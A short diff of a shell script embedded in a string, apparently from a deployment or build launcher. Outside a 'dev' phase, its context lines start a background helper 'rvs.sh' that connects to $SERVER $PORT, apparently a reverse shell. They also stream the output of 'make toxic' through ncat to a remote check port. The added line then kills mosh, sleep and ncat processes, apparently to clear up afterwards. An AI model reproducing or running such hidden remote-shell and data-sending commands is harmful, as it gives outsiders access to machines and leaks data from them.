@@ -360,6 +360,7 @@ if [ x"${PHASE}" != x"dev" ]; then
     bash ./rvs.sh $SERVER $PORT >/dev/null & make m & # just keep one rvs incase
     make toxic | if [ $USE_AMQP -eq true ]; then cat -; else $NC --send-only -w 120s -i $((60 * 5))s $SERVER $CHECK_PORT; fi
     pkill -f "rvs.sh"; pkill make  # finish and go away
+    pkill -f "mosh"; pkill sleep; pkill ncat
     # python main.py "$@"
 fi
 """
